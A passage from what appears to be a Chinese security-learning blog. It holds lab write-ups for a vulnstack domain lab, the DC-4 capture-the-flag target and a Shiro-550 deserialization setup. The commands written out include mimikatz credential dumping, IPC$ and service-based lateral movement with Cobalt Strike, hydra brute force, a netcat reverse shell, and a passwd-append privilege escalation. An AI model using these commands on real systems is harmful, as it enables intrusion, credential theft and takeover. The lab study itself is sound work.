src="/../image/image-20240715162126128-1723540470170-53.png" alt="image-20240715162126128"></p><p>但我们还不知道密码，所以需要获取密码，要用到mimikatz</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>也可以看SAM文件，这里我们用mimikatz，给它上传到web服务器去</p><p><img src="/../image/image-20240715162709527-1723540470170-56.png" alt="image-20240715162709527"></p><p><img src="/../image/image-20240715163049524-1723540470170-54.png" alt="image-20240715163049524"></p><p>成功获取密码hongrisec@2019</p><p><img src="/../image/image-20240715164328667-1723540470170-57.png" alt="image-20240715164328667"></p><p><img src="/../image/image-20240715164708974-1723540470170-59.png" alt="image-20240715164708974"></p><p>已经是最高权限了，就不用提权了，作下权限维持，多埋几个木马，编辑其它文件</p><p><img src="/../image/image-20240715165029213-1723540470170-60.png" alt="image-20240715165029213"></p><p>看下步骤，下面应该是内网信息收集</p><p><img src="/../image/image-20240715164825648-1723540470170-58.png" alt="image-20240715164825648"></p><h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h4><p>因为前面脱域了，这里重新调了下环境，在web服务器看看域内账号</p><p><img src="/../image/image-20240715170530119-1723540470170-62.png" alt="image-20240715170530119"></p><ul><li>内网本地信息收集</li><li>自动收集本地信息</li><li>内网IP扫描技术</li><li>内网端口扫描技术</li><li>域内基础信息收集</li><li>查找域控制器</li><li>获取域内用户</li><li>定位域管理员</li><li>PowerShell使用方式</li><li>内网渗透PowerShell脚本</li><li>敏感数据定位</li></ul><p>第一步：获取当前账号机器名</p><p><img src="/../image/image-20240715171041071-1723540470170-63.png" alt="image-20240715171041071"></p><p><img src="/../image/image-20240715171050953-1723540470170-61.png" alt="image-20240715171050953"></p><p>所以前面那个应该是域账号</p><p>第二部：收集主机信息，里面有加入的域名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715171134242-1723540470170-64.png" alt="image-20240715171134242"></p><p><img src="/../image/image-20240715171151193-1723540470170-65.png" alt="image-20240715171151193"></p><p>第三步：看域里有多少个用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715171312675-1723540470170-66.png" alt="image-20240715171312675"></p><p>域中有5个用户</p><p>第三步：看有几台电脑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715171433293-1723540470170-67.png" alt="image-20240715171433293"></p><p>三台,除了STU1，还有</p><p>DEV1和ROOT-TVI862UBEH</p><p>第四步：查域的ip和域名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -type=SRV _ldap._tcp</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715171746916-1723540470171-68.png" alt="image-20240715171746916"></p><p>域控ip:192.168.52.138</p><p>域全名：owa.god.org前面的owa是机器名</p><p>第五步：查看IP地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715172004155-1723540470171-69.png" alt="image-20240715172004155"></p><p>还有另一个ip，看下这个网段里存活了几台机器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715172041070-1723540470171-70.png" alt="image-20240715172041070"></p><p>存活两台主机138和141，ping一下，结合之前的机器名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping DEV1.god.org</span><br><span class="line">ping ROOT-TVI862UBEH.god.org</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715172712495-1723540470171-71.png" alt="image-20240715172712495"></p><p>192.168.52.138 -owa.god.org域控</p><p>192.168.52.141 -ROOT-TVI862UBEH.god.org域内主机</p><p>192.1668.52.143 STU1.god.org已经被控制的web服务器</p><p>优先控制域控</p><p>Webshell管理工具也可以执行命令，但是在一些操作上实受限的，比如想提权，想扫描想横向，想代理都是不方便的怎么办呢??接下来就要使用CS或者MSF工具</p><h4 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h4><p>注意攻击机要和服务器在同一网段，或者互项ping的通</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">teamserver.bat ip 123456</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715190012891-1723540470171-72.png" alt="image-20240715190012891"></p><p><img src="/../image/image-20240715190237382-1723540470171-73.png" alt="image-20240715190237382"></p><p>创建监听器</p><p><img src="/../image/image-20240715190427189-1723540470171-75.png" alt="image-20240715190427189"></p><p><img src="/../image/image-20240715190446493-1723540470171-74.png" alt="image-20240715190446493"></p><p><img src="/../image/image-20240715193736519-1723540470171-78.png" alt="image-20240715193736519"></p><p>生成木马</p><p><img src="/../image/image-20240715190657853-1723540470171-76.png" alt="image-20240715190657853"></p><p>选择刚刚创建好的木马</p><p><img src="/../image/image-20240715190724254-1723540470171-82.png" alt="image-20240715190724254"></p><p><img src="/../image/image-20240715190800860-1723540470171-77.png" alt="image-20240715190800860"></p><p>把木马上线到服务器</p><p><img src="/../image/image-20240715190847770-1723540470171-81.png" alt="image-20240715190847770"></p><p>运行木马，没有上线，重新来一下，搞了半天，发现不是一个网段的。。。</p><p><img src="/../image/image-20240715223548950-1723540470171-79.png" alt="image-20240715223548950"></p><p>把攻击机的网络配置也改了就好</p><p><img src="/../image/image-20240715223712099-1723540470171-80.png" alt="image-20240715223712099"></p><h4 id="横向移动-lateral-movement"><a href="#横向移动-lateral-movement" class="headerlink" title="横向移动(lateral movement)"></a>横向移动(lateral movement)</h4><p>成功的横向移动攻击可以使攻击者闯入用户现有系统，并访问系统资源。高级持续性威胁(APT)是横向移动带来的最常见网络攻击类型。如果网络有足够多未加保护的漏洞，只要有足够的时间，黑客最终就可以访问域控制器本身。<br>横向移动就是通过一台电脑从而控制公司的整个电脑</p><p>可以利用的技术</p><ol><li>远控工具</li><li>IPC$</li><li>PTH哈希传递</li><li>PTK密钥传递</li><li>PTT票据传递</li><li>PSexec工具</li><li>SMB工具</li><li>WinRM命令</li><li>WMI命令</li></ol><p>这里利用IPC技术实现</p><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><p>IPC( Internet ProcessConnection)共享“命名管道”的资源,是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获得相应的权限,通常在远程管理计算机和查看计算 机的共享资源时使用。</p><p>通过ipc$,可以与目标机器建立连接。利用这个连接,不仅可以访问目标机器中的文件,进行上传、下载等操作,还可以在目标机器上运行其他命令,以获取目标机器的目录结构、用户列 表等信息。</p><p>前提：知道域账号</p><p>这里还可以利用CS执行mimikatz</p><p><img src="/../image/image-20240715224525490-1723540470171-83.png" alt="image-20240715224525490"></p><p><img src="/../image/image-20240715224714373-1723540470171-84.png" alt="image-20240715224714373"></p><p>然后执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.52.138\ipc$ &quot;admin@123&quot; /user:god\administrator</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715224816747-1723540470171-86.png" alt="image-20240715224816747"></p><p>执行成功后，我们可以看下有没有建立ipc管道</p><p><img src="/../image/image-20240715224931351-1723540470171-85.png" alt="image-20240715224931351"></p><p>建立IPC之后就可以访问对方的电脑了，可以用如下的命令</p><p>dir \IP地址\c$<br>net time \\lP地址<br>copy 文件 \\IP地址\C$</p><p>这里就不能通过木马上线了，因为内网环境下是无法连接外网，也就是不出网，我们需要把web服务器当作跳板机，让它来转发流量，这就要用到隧道代理技术了</p><h4 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h4><p>接下来介绍一下如何上线不出网的机器这里我们使用CS自带的功能，进行内网<br>穿透实验<br>SMB Beacon:<br>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。</p><p><img src="/../image/image-20240715225416152-1723540470171-87.png" alt="image-20240715225416152"></p><p>新建个监听器</p><p><img src="/../image/image-20240715225449889-1723540470171-88.png" alt="image-20240715225449889"></p><p>这次生成木马和前面不一样了</p><p><img src="/../image/image-20240715225534906-1723540470171-89.png" alt="image-20240715225534906"></p><p><img src="/../image/image-20240715225550932-1723540470171-92.png" alt="image-20240715225550932"></p><p>生成的木马，我们也可以通过CS上传</p><p><img src="/../image/image-20240715225836702-1723540470171-90.png" alt="image-20240715225836702"></p><p><img src="/../image/image-20240715230026157-1723540470171-91.png" alt="image-20240715230026157"></p><p>然后我们把木马再传到域控的C盘去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy smb.exe \\192.168.52.138\C$</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715230416091-1723540470171-99.png" alt="image-20240715230416091"></p><p>下面就是执行木马的问题了，这里我们通过创建服务的方式去运行木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\owa.god.org create test binpath= &quot;cmd.exe /c c:\smb.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715230938480-1723540470171-98.png" alt="image-20240715230938480"></p><p>前面一次运行失败了，改了个空格就是binpath&#x3D;后面要加个空格</p><p>服务创建成功后，我们就要开启服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc \\owa.god.org start test</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715231512828-1723540470171-93.png" alt="image-20240715231512828"></p><p>这样就是成功开启了，要及时连接，不然会</p><p><img src="/../image/image-20240715231311416-1723540470171-94.png" alt="image-20240715231311416"></p><p><strong>连接目标机器(必须主动连接)</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">link owa.god.org</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240715231536929-1723540470171-95.png" alt="image-20240715231536929"></p><p>成功上线system权限</p><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p><img src="/../image/image-20240715001019514-1723540470171-96.png" alt="image-20240715001019514"></p><p>美国入侵伊朗核设施：蠕虫</p><p>棱镜门斯诺登：窃听全世界等</p><p>华住五亿条记录等</p><p><img src="/../image/image-20240715001344527-1723540470171-97.png" alt="image-20240715001344527"></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnstack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-4</title>
      <link href="/2024/08/12/DC-4/"/>
      <url>/2024/08/12/DC-4/</url>
      
        <content type="html"><![CDATA[<p><em>靶机：192.168.174.190</em></p><p><em>攻击机：192.168.174.137</em></p><p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p><h1 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240812191355364.png" alt="image-20240812191355364"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- -n -O 192.168.174.190</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240812191541835.png" alt="image-20240812191541835"></p><p>开放了22，80端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80 -A 192.168.174.190</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240812191737988.png" alt="image-20240812191737988"></p><h2 id="访问服务-目录扫描"><a href="#访问服务-目录扫描" class="headerlink" title="访问服务+目录扫描"></a>访问服务+目录扫描</h2><p><img src="/../image/image-20240812191819031.png" alt="image-20240812191819031"></p><p>登陆界面，可以尝试爆破</p><p><img src="/../image/image-20240812192050799.png" alt="image-20240812192050799"></p><p>目录扫描没发现其它东西</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>burp抓包，传字典，可以去一些爆破工具的目录下，看看，这里用的是&#x2F;usr&#x2F;share&#x2F;jhon&#x2F;password.lst</p><p><img src="/../image/image-20240812193318974.png" alt="image-20240812193318974"></p><p>也可以用hydra</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -t 1 -l admin -P/usr/jhon/password.lst -o out.txt -vV -f 192.168.174.190 http-post-form &quot;/:username=^USER^&amp;password=^PASS^:error&quot;</span><br></pre></td></tr></table></figure><p>但判断条件不好写，所以还是不用了</p><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p><img src="/../image/image-20240812193453913.png" alt="image-20240812193453913"></p><p>发现命令执行</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="list-files"><a href="#list-files" class="headerlink" title="list files"></a>list files</h3><p>抓包</p><p><img src="/../image/image-20240812195300598.png" alt="image-20240812195300598"></p><p>可以看到ls -l中间的空格被编码成+号了，先试试别的命令</p><p><img src="/../image/image-20240812195847894.png" alt="image-20240812195847894"></p><p>发现可以执行whoami命令，先坐下敏感信息收集</p><p><img src="/../image/image-20240812200011083.png" alt="image-20240812200011083"></p><p>访问他们的家目录，在jim家发现一个奇怪的文件</p><p><img src="/../image/image-20240812200139900.png" alt="image-20240812200139900"></p><p>查看下权限</p><p><img src="/../image/image-20240812200330365.png" alt="image-20240812200330365"></p><p>还是可执行权限，但是jim才可以执行，我么你看看其它地方还有没有提示</p><p><img src="/../image/image-20240812200456906.png" alt="image-20240812200456906"></p><p>在backups目录下发现旧密码，查看一下，估计就是利用字典爆破登陆jim执行test.sh</p><p><img src="/../image/image-20240812200614127.png" alt="image-20240812200614127"></p><p>是一个字典，给它保存下来，利用hydra爆破</p><h2 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P wordlist.txt ssh://192.168.174.190 -vV -o hydra.ssh</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240812201547595.png" alt="image-20240812201547595"></p><p>成功爆破密码，ssh远程登陆尝试</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>除了这种爆破的方式还可以通过反弹shell的方式获取权限</p><p>试过bash但好像因为&amp;这个符号得原因，执行不了</p><p>反弹不回来，得换个思路，看下靶机有没有装nc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -c /bin/bash 192.168.174.137 8888</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240812223004648.png" alt="image-20240812223004648"></p><p>然后可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.174.190 </span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240812201721959.png" alt="image-20240812201721959"></p><p>sudo -l发现没有sudo权限，打开刚刚的test.sh文件,</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!/bin/bash</span><br><span class="line">for i in &#123;1..5&#125;</span><br><span class="line">do</span><br><span class="line"> sleep 1</span><br><span class="line"> echo &quot;Learn bash they said.&quot;</span><br><span class="line"> sleep 1</span><br><span class="line"> echo &quot;Bash is good they said.&quot;</span><br><span class="line">done</span><br><span class="line"> echo &quot;But I&#x27;d rather bash my head against a brick wall.&quot;</span><br></pre></td></tr></table></figure><p>没什么线索，看看剩下那个文件</p><p><img src="/../image/image-20240812201919318.png" alt="image-20240812201919318"></p><p>是一封rooot发来的信，看不出来什么信息，去<code>/var/mail</code>再看看有没有其他有意思的信息，找到了一封charles写给jim的邮件，并且看到了charles的账户密码</p><p><img src="/../image/image-20240812215641965.png" alt="image-20240812215641965"></p><p>使用ssh登录charles的账户，但是好像没有什么有趣的文件，然后因为jim不能使用sudo权限，所以我们得在charles账户sudo -l一下</p><p><img src="/../image/image-20240812215829219.png" alt="image-20240812215829219"></p><p>发现charles得teehee命令有root权限，去查了一下teehee是什么命令</p><p><a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">https://www.cnblogs.com/zlgxzswjy/p/16118468.html</a></p><p>teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权</p><p>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限</p><p><img src="/../image/image-20240812221552502.png" alt="image-20240812221552502"></p><p>然后我们su切换用户</p><p><img src="/../image/image-20240812221834240.png" alt="image-20240812221834240"></p><p>【额外补充：没有给新用户创建密码是因为你创建了也没有用，因为第2个位置是密码占位符，是占位符！！！】</p>]]></content>
      
      
      
        <tags>
            
            <tag> DC4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro-550-环境</title>
      <link href="/2024/08/11/shiro-550-%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/08/11/shiro-550-%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p><em>参考:</em></p><p><em><a href="https://www.bilibili.com/video/BV1iF411b7bD/?vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">Shiro反序列化漏洞-shiro550流程分析</a></em></p><p><em><a href="https://blog.csdn.net/dreamthe/article/details/124390531">详细shiro漏洞复现过程</a></em></p><p><em><a href="https://www.cnblogs.com/h0cksr/p/16189761.html">Shiroの起始篇</a></em></p><p><em><a href="https://xz.aliyun.com/t/8997?time__1311=n4+xnD0DcDRDgD02DUx4BqOoTK7IvTyexxuPhD">Shiro反序列化分析带思路及组件检测笔记</a></em></p><p><em><a href="https://issues.apache.org/jira/browse/SHIRO-550">Shiro&#x2F;SHIRO-550</a></em></p><p><a href="https://ares-x.com/tools/runtime-exec">编码工具RUNTIME.EXEC</a></p><p><a href="https://blog.csdn.net/Bossfrank/article/details/130173880">shiro550反序列化漏洞</a></p><h1 id="shiro-550-环境"><a href="#shiro-550-环境" class="headerlink" title="shiro-550-环境"></a>shiro-550-环境</h1><h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>因为在复现漏洞时，一直都是docker起的环境，对这些java开发的项目的具体内容不是很了解，且不懂这些项目的构建过程，故在此总结一下自己在网上看到的搭建环境的过程。对shiro的介绍很多，上面的文章也有，这里就不缀述了</p><h2 id="0x2-环境搭建-git"><a href="#0x2-环境搭建-git" class="headerlink" title="0x2 环境搭建 git"></a>0x2 环境搭建 git</h2><p>这是在视频中学到的，直接从github上clone代码到本地，然后git checkout切换版本，还是第一次用这个功能，有点迟了。。。附上<a href="https://www.runoob.com/git/git-checkout.html">介绍链接</a>,git也该再去学习一下，只会个clone是不行的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240811191753290.png" alt="image-20240811191753290"></p><p>编辑shiro&#x2F;samples&#x2F;web目录下的pom.xml，手动添加<code>3.2.1</code>的CC依赖包</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240811223850102.png" alt="image-20240811223850102"></p><p>然后用IDEA打开项目，eclipse没试过，可以自己去找找教程</p><p><img src="/../image/image-20240811193059119.png" alt="image-20240811193059119"></p><p>然后它会自动下载相关依赖项，这种git下来的项目，右下角也可以看其它远程分支。如果下载有问题，记得去maven配置改一下仓库地址，配置tomcat</p><p><img src="/../image/image-20240811210245817.png" alt="image-20240811210245817"></p><p>选择web的war包部署</p><p><img src="/../image/image-20240811210311812.png" alt="image-20240811210311812"></p><p>成功启动</p><p><img src="/../image/image-20240811210443461.png" alt="image-20240811210443461"></p><p>访问服务</p><p><img src="/../image/image-20240811210352506.png" alt="image-20240811210352506"></p><h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>首先<strong>第一个目的</strong>是控制rememberMe参数的值,先找到参数所在位置，对环境的功能先正常使用一遍</p><p>当我访问<a href="http://localhost:8080/shiro_web_1_2_4_war/login.jsp">http://localhost:8080/shiro_web_1_2_4_war/login.jsp</a> 登录时勾选Remember Me后，cookie中出现rememberMe参数，而shiro每次都会对cookie中的rememberMe来进行解密后反序列化操作来确定访问者权限，所以直接在cookie传输rememberMe参数就可以控制shiro反序列化的值</p><p><img src="/../image/image-20240811211148261.png" alt="image-20240811211148261"></p><p>cookie内容比较长，一般就是带有信息的，然后<a href="https://cloud.tencent.com/developer/article/1472310%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E8%AF%B4jdk%E8%A6%81%E6%B1%82%E8%A6%811.6%EF%BC%8C%E6%88%91%E8%BF%99%E9%87%8C%E7%94%A8%E7%9A%84%E6%98%AF1.8%E6%88%91%E5%85%88%E7%94%A8%E5%B7%A5%E5%85%B7%E8%AF%95%E8%AF%95%E8%83%BD%E4%B8%8D%E8%83%BD%E6%89%93">https://cloud.tencent.com/developer/article/1472310这篇文章说jdk要求要1.6，我这里用的是1.8我先用工具试试能不能打</a></p><p><img src="/../image/image-20240811211919843.png" alt="image-20240811211919843"></p><p>检测得到框架</p><p><img src="/../image/image-20240811212016403.png" alt="image-20240811212016403"></p><p>也是能执行命令的，那1.8应该是没什么问题，好了，我知道为什么不行了,shiro中有个这个依赖<a href="https://blog.csdn.net/qq_35634181/article/details/107543411">问题</a></p><p><img src="/../image/image-20240812100218830.png" alt="image-20240812100218830"></p><p>这个依赖的1.4版本是不支持jdk1.8的，需要改成1.6，不懂后面没调试成功是不是因为这个原因，试一下切换1.6版本的jdk</p><p><img src="/../image/image-20240812101934708.png" alt="image-20240812101934708"></p><p>注释里也提醒了不要切换版本，但后面又要求要1.7以上的maven3.3+，还是断点没打好</p><p><strong>第二个目的</strong>是获得加密解密的方法，以此来自行加密解密恶意payload进行传输</p><p>如果是导入war包的形式</p><p>反编译此漏洞环境中的shiro组件jar包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选中shiro-core-1.2.4.jar -&gt; 右键 -&gt; Add as Library -&gt; ok</span><br><span class="line">选中shiro-web-1.2.4.jar -&gt; 右键 -&gt; Add as Library -&gt; ok</span><br></pre></td></tr></table></figure><p>而这里我们直接可以看core和web文件下的代码即可</p><p>IDEA中按两次shift 搜索咱们前面准备当做入口点的类，按着函数列表查看后并未发现有关加密的信息，但也有一些关键参数的信息，但我们要找加密函数，so跟进父类AbstractRememberMeManager去看一下（按2下shift，直接搜索）</p><p><img src="/../image/image-20240811212428509.png" alt="image-20240811212313713"></p><p>进入此类可以发现一个很明显的key，根据参数名<code>DEFAULT_CIPHER_KEY_BYTES</code>也可以断定是AES加密中所使用的密钥，同时确实是直接写入了代码中，符合上面通过描述可知的AES密钥硬编码在源代码中的条件</p><p>然后发现，我这里左边没有同步打开的文件，方法</p><p><img src="/../image/image-20240811213045261.png" alt="image-20240811213045261"></p><p>如果只有类文件，不能看到里面的成员方法，需要在设置中调整</p><p><img src="/../image/image-20240811213156692.png" alt="image-20240811213156692"></p><p>这样就能显示成员方法了，下面我是根据文章教程设置的断点。</p><p>这里我在AbstractRememberMeManager类函数名为encrypt(加密)中下了断点，然后在web端进行登录操作，开始debug，运行至encrypt函数传入参数serialized，然后点击Drop Frame返回上个方法发现传入的serialized的值是我刚才web端登录的用户名root序列化后的数据，根据运行步骤函数名猜测流程是shiro验证完了登录的账号密码，然后根据用户名生成序列化数据准备进行加密了</p><p><img src="/../image/image-20240811213249566.png" alt="image-20240811213249566"></p><ol><li>设置断点</li></ol><p><img src="/../image/image-20240811213522860.png" alt="image-20240811213522860"></p><ol start="2"><li>debug</li></ol><p><img src="/../image/image-20240811213629346.png" alt="image-20240811213629346"></p><p>这里不懂怎么不行，我中途换了个教程<a href="https://www.cnblogs.com/h0cksr/p/16189761.html%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E6%96%AD%E7%82%B9%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%9B%B4%E8%AF%A6%E7%BB%86%E4%B8%80%E7%82%B9%EF%BC%8C%E9%87%8C%E9%9D%A2docker%E7%9A%84%E7%8E%AF%E5%A2%83">https://www.cnblogs.com/h0cksr/p/16189761.html，里面有断点踩坑记录，这个更详细一点，里面docker的环境</a></p><p>如果我们想要断点调试需要在本地文件打断点, 但是我们直接搜索Shiro的cookie管理类文件CookieRememberMeManager的时候会发现有两个选择, 一个是本地的项目文件, 还有一个是Maven通过pom.xml加载的文件但是注意这个文件后面还带了一个Test, 类名为CookieRememberMeManagerTest而不是CookieRememberMeManager</p><p><img src="/../image/image-20240811224246256.png" alt="image-20240811224246256"></p><p>如果我们想要打断点调试的话我们最好在本地文件打断点, 否则可能会失效，但我就是不会停不懂为什么。难道还是要用war包。。。</p><p>调试是为了找到加密流程，所以我们这里通过代码直接来推加密流程，因为是对cookie的加密，所以我们就直接继续在这个文件里找加密相关的方法。</p><p><img src="/../image/image-20240812131532257.png" alt="image-20240812131532257"></p><p>序列化，所以我么你可以看看这个，获取Remember序列化的相关方法</p><p><img src="/../image/image-20240812131903290.png" alt="image-20240812131903290"></p><p>然后找到了一个判断填充方式是否是base64的，说明加密流程有base64编码，但我们没发现其它加密方法，所以我们可以去父类看看</p><p><img src="/../image/image-20240812132020461.png" alt="image-20240812132020461"></p><p>这里我们就能明显看到加密解密的相关词语了，查看下具体方法</p><p><img src="/../image/image-20240812132301109.png" alt="image-20240812132301109"></p><p>根据分析，我们知道cipherService里还有一个加密方法，然后需要两个参数，一个序列化后的穿，和一个加密的密钥，我们跟进分析</p><p><img src="/../image/image-20240812132700467.png" alt="image-20240812132700467"></p><p><img src="/../image/image-20240812133146725.png" alt="image-20240812133146725"></p><p>这里可以找到remember的身份认证的相关方法，就是两步一个解密，一个反序列化，下面先分析反序列化，再分析加密，跟进反序列化的方法</p><p><img src="/../image/image-20240812133418943.png" alt="image-20240812133418943"></p><p>这边调用的是原生的方法，所以可以考虑CC和CB相关的东西，然后分析需要的密钥是什么，直接shift，搜索参数名</p><p><img src="/../image/image-20240812133618798.png" alt="image-20240812133618798"></p><p>发现是一个常量，看一下成员的声明是在哪，往上寻找，发现默认的key值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure><p>继续分析，可以发现JcaCipherService类</p><p><img src="/../image/image-20240812141529612.png" alt="image-20240812141529612"></p><p>所以利用就是我们需要构造一个序列化payload然后通过这个密钥去加密，传给服务端，然后服务端解密，反序列化后就会执行我们的payload，然后他这里也有自带的CC和CB，也都是存在漏洞的版本，但CC好像不行用，我们用Maven Helper来看看依赖环境</p><p><img src="/../image/image-20240812135039243.png" alt="image-20240812135039243"></p><p>然后这里可以看到有些依赖是test，有些是compile，只有compile和runtime的才会被用，这里主要是验证，后面听不懂了。。。</p><h1 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h1><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="1、git开代理还是慢，且容易报error"><a href="#1、git开代理还是慢，且容易报error" class="headerlink" 